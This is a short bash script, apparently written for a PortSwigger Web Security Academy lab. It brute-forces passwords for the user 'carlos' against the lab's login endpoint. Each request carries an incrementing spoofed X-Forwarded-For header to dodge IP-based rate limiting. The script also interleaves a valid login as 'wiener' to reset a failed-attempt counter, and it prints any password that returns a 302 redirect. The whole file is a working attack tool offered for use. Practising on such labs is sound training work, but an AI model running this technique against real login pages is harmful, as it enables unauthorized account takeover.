#!/bin/bash

fake_ip=19999

current_user="carlos"

while read PASSWORD; do

    #if [ $current_user = "carlos" ]; then
    #current_user="wiener"
    #else
    #current_user="carlos"
    #fi

    #if [ $current_user = "wiener" ];then
    #    PASSWORD="peter"
    #fi

    code=$(curl -w "%{http_code}\n" -o /dev/null -s -k -d "username=$current_user&password=$PASSWORD" -H "Cookie: session=VT5lKiRsP7zxeXSJwAZKzNYBiAEQjdTC" -H "X-Forwarded-For: $fake_ip" -X POST "https://0a83002b03e012cac0ea32de004800dd.web-security-academy.net/login")
    code2=$(curl -w "%{http_code}\n" -o /dev/null -s -k -d "username=wiener&password=peter" -H "Cookie: session=VT5lKiRsP7zxeXSJwAZKzNYBiAEQjdTC" -H "X-Forwarded-For: $fake_ip" -X POST "https://0a83002b03e012cac0ea32de004800dd.web-security-academy.net/login")

    if [ $code -eq "302" ];then
    echo $code $PASSWORD
    else
        echo -n "."
    fi

    let fake_ip++
    
done < ./passwords.txt
